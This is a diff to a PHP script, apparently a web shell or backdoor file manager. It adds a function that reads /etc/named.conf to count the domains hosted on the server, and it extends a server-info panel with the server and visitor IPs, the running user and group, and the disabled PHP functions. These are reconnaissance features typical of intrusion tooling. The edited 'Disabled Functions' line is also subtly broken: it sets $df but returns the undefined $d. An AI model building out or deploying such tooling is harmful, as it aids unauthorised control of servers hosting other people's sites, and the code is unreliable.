@@ -186,14 +186,28 @@ foreach ($parts as $part) {
 $self_dir = dirname(realpath(__FILE__));
 $docroot = realpath($_SERVER['DOCUMENT_ROOT']);
 
+//Count Domain
+function countDomains($f='/etc/named.conf'){
+    if(strtoupper(substr(PHP_OS,0,3))==='WIN') return '-';
+    if(!is_readable($f)) return "-";
+    $c=0;
+    foreach(file($f, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $l)
+        if(strpos($l,'zone')!==false && preg_match('#zone "(.*)"#',$l,$m) && strlen(trim($m[1]))>2) $c++;
+    return "$c Domain";
+}
+
 //Server info
 function getServerInfo(){
     return [
+        'Server IP' => gethostbyname(gethostname()),
         'OS' => php_uname(),
         'PHP Version' => PHP_VERSION,
         'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI',
-        'Disabled Functions' => ini_get('disable_functions'),
+        'Disabled Functions' => ($df = ini_get('disable_functions')) ? $d : '-',
         'Loaded Extensions' => implode(', ', get_loaded_extensions()),
+        'My IP' => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '?',
+        'User:Group' => get_current_user() . ':' . (function_exists('posix_getgrgid') && function_exists('posix_geteuid') ? posix_getgrgid(posix_geteuid())['name'] : '?'),
+        'Domains' => countDomains()
     ];
 }
 ?>
